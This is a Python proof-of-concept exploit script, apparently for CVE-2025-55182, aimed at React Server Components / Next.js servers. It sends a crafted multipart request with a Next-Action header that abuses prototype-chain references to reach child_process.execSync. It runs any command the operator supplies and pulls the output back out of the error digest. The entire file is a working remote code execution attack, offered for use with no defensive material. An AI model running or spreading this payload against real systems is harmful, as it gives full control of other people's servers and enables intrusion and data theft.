import requests
import argparse
import sys
import json

def run_exploit():
    banner = r"""
      _____  ______          _____ _______ ___   _____ _    _ ______ _      _      
     |  __ \|  ____|   /\   / ____|__   __|__ \ / ____| |  | |  ____| |    | |     
     | |__) | |__     /  \ | |       | |     ) | (___ | |__| | |__  | |    | |     
     |  _  /|  __|   / /\ \| |       | |    / / \___ \|  __  |  __| | |    | |     
     | | \ \| |____ / ____ \ |____   | |   / /_ ____) | |  | | |____| |____| |____ 
     |_|  \_\______/_/    \_\_____|  |_|  |____|_____/|_|  |_|______|______|______|
    """
    print(banner)

    parser = argparse.ArgumentParser(description="CVE-2025-55182 POC by 0xSN1PE")
    parser.add_argument("-u", "--url", help="Target URL (e.g., http://localhost:3000/)", required=True)
    parser.add_argument("-c", "--command", help="Command to execute (e.g., 'id')", required=True)
    
    args = parser.parse_args()

    target_url = args.url
    inner_command = args.command
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    # Payload
    escaped_cmd = inner_command.replace('"', '\\"')
    
    exec_payload = (
        f"process.mainModule.require('child_process')"
        f".execSync('{escaped_cmd}', {{'timeout':5000}})"
        f".toString().trim()"
    )

    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        '{\n'
        '  "then": "$1:__proto__:then",\n'
        '  "status": "resolved_model",\n'
        '  "reason": -1,\n'
        '  "value": "{\\"then\\":\\"$B1337\\"}",\n'
        '  "_response": {\n'
        f'    "_prefix": "var res={exec_payload}; throw Object.assign(new Error(\'NEXT_REDIRECT\'), {{digest: res}});",\n'
        '    "_chunks": "$Q2",\n'
        '    "_formData": {\n'
        '      "get": "$1:constructor:constructor"\n'
        '    }\n'
        '  }\n'
        '}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        '"$@0"\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        '[]\r\n'
        f"--{boundary}--\r\n"
    )

    headers = {
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Assetnote/1.0.0"
    }

    # Send Request
    try:
        print(f"[*] Executing: {inner_command}")
        response = requests.post(target_url, headers=headers, data=body, timeout=15)
        
        chunks = response.text.split('\n')
        
        found_output = False
        for chunk in chunks:

            if chunk.startswith("1:E"):
                found_output = True

                raw_json = chunk[3:]
                try:
                    data = json.loads(raw_json)
                    result = data.get("digest", "")
                    
                    formatted_result = result.encode().decode('unicode_escape')
                    
                    print("\n--- COMMAND OUTPUT ---")
                    print(formatted_result)
                    print("----------------------")
                except Exception as e:
                    print(f"[!] Error parsing output JSON: {e}")
                break
        
        if not found_output:
            print("[!] Could not find the result chunk in the response.")

    except Exception as e:
        print(f"[!] Request failed: {e}")

if __name__ == "__main__":
    run_exploit()